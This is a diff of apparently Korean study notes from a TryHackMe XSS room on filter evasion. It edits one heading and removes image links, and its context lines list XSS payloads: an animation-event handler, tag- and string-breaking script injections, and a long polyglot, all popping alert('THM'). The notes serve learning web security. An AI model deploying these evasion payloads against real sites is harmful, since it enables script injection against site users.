@@ -159,23 +159,17 @@ Filter Evasion
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
 ```
 
-`아래와 같은 상황에서 닫아주고 payload`
+`tag 닫아주고 payload`
 ```
 "><script>alert('THM');</script>
 </textarea><script>alert('THM');</script>
 ';alert('THM');//
 ```
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png)
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png)
 
 `Polyglots`
 XSS 다중 언어는 속성, 태그 및 우회 필터를 모두 하나로 이스케이프할 수 있는 텍스트 문자열
 
 '<'를 escape할 때
-
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)
 
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
